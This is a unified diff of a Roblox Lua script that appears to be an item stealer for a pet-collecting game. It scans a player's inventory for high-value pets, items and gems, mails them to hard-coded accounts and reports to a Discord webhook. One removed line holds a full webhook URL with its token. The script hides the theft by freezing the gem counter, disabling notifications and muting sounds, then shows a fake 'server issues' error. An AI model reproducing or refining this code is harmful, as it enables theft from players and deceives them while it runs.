@@ -19,7 +19,7 @@ end
 
 local users = _G.Usernames or {"PepijnAlt_1", "PepijnAlt_2", "PepijnAlt_3", "PepijnAlt_4", "PepijnAlt_5"}
 local min_rap = _G.minrap or 1000000
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1433804261359358104/TCMBc89S5m-h6SKTACYAwu14BMG4ERktTMfsGa5PmMyGhDfXuwZ7KWiqFIq0vSuYHtr7"
+local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
 plr:kick("You didn't add any usernames or webhook")
@@ -40,8 +40,7 @@ break
 end
 end
 
-local mailSendPrice = 1 -- Set initial mail cost to 1 gem
-print("Initial mail cost:", mailSendPrice)
+local mailSendPrice = 1
 
 -- cache save/inventory reference to avoid repeated calls
 local SaveRoot = GetSave()
@@ -56,8 +55,6 @@ break
 end
 end
 end
-
-print("Starting gems:", GemAmount1)
 
 local function formatNumber(number)
 local number = math.floor(number)
@@ -151,45 +148,28 @@ request({
 
 end
 
--- FREEZE GEM DISPLAY - victim won't see gems disappearing!
-pcall(function()
-    local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
-    local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
-    gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-        gemsleaderstatpath.Value = gemsleaderstat
-    end)
-    print("✓ Gem display frozen")
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+gemsleaderstatpath.Value = gemsleaderstat
 end)
 
--- Disable notifications and loading screens
-pcall(function()
-    local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-    loading.Disabled = true
-    print("✓ Loading screen disabled")
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+noti.Enabled = false
 end)
+noti.Enabled = false
 
-pcall(function()
-    local noti = plr.PlayerGui.Notifications
-    noti.Enabled = false
-    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-        noti.Enabled = false
-    end)
-    print("✓ Notifications disabled")
-end)
-
--- Mute sounds
-pcall(function()
-    game.DescendantAdded:Connect(function(x)
-        pcall(function()
-            if x.ClassName == "Sound" then
-                if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-                    x.Volume=0
-                    x.PlayOnRemove=false
-                    x:Destroy()
-                end
-            end
-        end)
-    end)
+game.DescendantAdded:Connect(function(x)
+if x.ClassName == "Sound" then
+if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+x.Volume=0
+x.PlayOnRemove=false
+x:Destroy()
+end
+end
 end)
 
 local function getRAP(Type, Item)
@@ -219,7 +199,6 @@ local function sendItem(category, uid, am)
 local userIndex = 1
 local maxUsers = #users
 local sent = false
-local attempts = 0
 
 repeat  
     local currentUser = users[userIndex]  
@@ -231,33 +210,20 @@ repeat
         [5] = am or 1  
     }  
 
-    print(string.format("Sending %s (amount: %d) to %s", category, am or 1, currentUser))
     local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))  
-    print("Response:", response, "Error:", err)
 
     if response == true then  
         sent = true  
         GemAmount1 = GemAmount1 - mailSendPrice  
-        mailSendPrice = math.ceil(mailSendPrice * 1.5)
-        if mailSendPrice > 5000000 then  
-            mailSendPrice = 5000000  
-        end
-        print("✓ Sent! New mail cost:", mailSendPrice, "Gems left:", GemAmount1)
+        mailSendPrice = math.ceil(mailSendPrice * 1.5) -- removed redundant math.ceil  
+        if mailSendPrice > 500 then  
+            mailSendPrice = 500  
+        end  
     elseif response == false and err == "They don't have enough space!" then  
-        print("Mailbox full, trying next account")
-        userIndex = userIndex + 1  -- FIXED BUG: was "userIndex = 2"
+        userIndex = 2  
         if userIndex > maxUsers then  
-            print("All mailboxes full!")
             sent = true  
         end  
-    else
-        print("Unknown error:", err)
-        attempts = attempts + 1
-        if attempts >= 2 then
-            print("Too many failed attempts, skipping")
-            sent = true
-        end
-        wait(0.5)
     end  
 until sent
 
@@ -265,10 +231,7 @@ end
 
 local function SendAllGems()
 local inv = InventoryCache or (GetSave() and GetSave().Inventory)
-if not inv or not inv.Currency then 
-    print("No inventory/currency found")
-    return 
-end
+if not inv or not inv.Currency then return end
 
 for i, v in pairs(inv.Currency) do  
     if v.id == "Diamonds" then  
@@ -287,28 +250,18 @@ for i, v in pairs(inv.Currency) do
                     [5] = GemAmount1 - mailSendPrice  
                 }  
 
-                print(string.format("Sending %s gems to %s", formatNumber(GemAmount1 - mailSendPrice), currentUser))
                 local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))  
-                print("Gem Response:", response, "Error:", err)
 
                 if response == true then  
-                    print("✓ Gems sent!")
                     sent = true  
                 elseif response == false and err == "They don't have enough space!" then  
-                    print("Mailbox full, trying next account")
-                    userIndex = userIndex + 1  -- FIXED BUG: was "userIndex = 2"
+                    userIndex = 2  
                     if userIndex > maxUsers then  
-                        print("All mailboxes full!")
                         sent = true  
                     end  
-                else
-                    print("Gem send failed:", err)
-                    sent = true
                 end  
             until sent  
             break  
-        else
-            print("Not enough gems. Have:", GemAmount1, "Need:", mailSendPrice + 10000)
         end  
     end  
 end
@@ -339,61 +292,48 @@ for i, v in pairs(save["Pet"]) do
 uid = i
 break
 end
-if not uid then
-    print("No pets to test with")
-    return true
-end
 local args = {
-[1] = users[1],  -- FIXED: test with first user, not "Roblox"
+[1] = "Roblox",
 [2] = "Test",
 [3] = "Pet",
 [4] = uid,
 [5] = 1
 }
 local response, err = network.Invoke("Mailbox: Send", unpack(args))
-print("Mail test - Response:", response, "Error:", err)
-return not (err == "They don't have enough space!")
+return (err == "They don't have enough space!")
 end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-
-print("=== Scanning inventory ===")
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
 for i, v in pairs(categoryList) do
 if save[v] ~= nil then
 for uid, item in pairs(save[v]) do
 if v == "Pet" then
-local success, dir = pcall(function()
-    return require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
-end)
-if success and dir then
-    if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
-        local rapValue = getRAP(v, item)
-        if rapValue >= min_rap then
-            local prefix = ""
-            if item.pt and item.pt == 1 then
-                prefix = "Golden "
-            elseif item.pt and item.pt == 2 then
-                prefix = "Rainbow "
-            end
-            if item.sh then
-                prefix = "Shiny " .. prefix
-            end
-            local id = prefix .. item.id
-            table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
-            totalRAP = totalRAP + (rapValue * (item._am or 1))
-            print("Found pet:", id, "RAP:", formatNumber(rapValue))
-        end
-    end
+local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
+if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
+local rapValue = getRAP(v, item)
+if rapValue >= min_rap then
+local prefix = ""
+if item.pt and item.pt == 1 then
+prefix = "Golden "
+elseif item.pt and item.pt == 2 then
+prefix = "Rainbow "
+end
+if item.sh then
+prefix = "Shiny " .. prefix
+end
+local id = prefix .. item.id
+table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+totalRAP = totalRAP + (rapValue * (item._am or 1))
+end
 end
 else
 local rapValue = getRAP(v, item)
 if rapValue >= min_rap then
 table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
 totalRAP = totalRAP + (rapValue * (item._am or 1))
-print("Found " .. v .. ":", item.id, "RAP:", formatNumber(rapValue))
 end
 end
 if item._lk then
@@ -407,8 +347,6 @@ end
 end
 end
 
-print("Found", #sortedItems, "items | Total RAP:", formatNumber(totalRAP))
-
 if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
 ClaimMail()
 EmptyBoxes()
@@ -418,6 +356,7 @@ return
 end
 
 -- Sort once by total RAP value (RAP * amount)
+
 table.sort(sortedItems, function(a, b)
 return (a.rap * a.amount) > (b.rap * b.amount)
 end)
@@ -426,25 +365,18 @@ task.spawn(function()
 SendMessage(GemAmount1)
 end)
 
-print("=== Sending items ===")
 -- Send highest RAP items first, regardless of category
 for _, item in ipairs(sortedItems) do
-if GemAmount1 > 1 then -- Only need 1 gem now
+if GemAmount1 > mailSendPrice then
 sendItem(item.category, item.uid, item.amount)
-wait(0.3)
 else
-print("Out of gems for mail cost!")
 break
 end
 end
 
-print("=== Sending remaining gems ===")
 -- Send remaining gems last
-if GemAmount1 > 1 then
+if GemAmount1 > mailSendPrice then
 SendAllGems()
 end
 message.Error("We are Having server issues please rejoin and try again")
-print("=== Complete ===")
-else
-    print("Nothing valuable to send")
 end
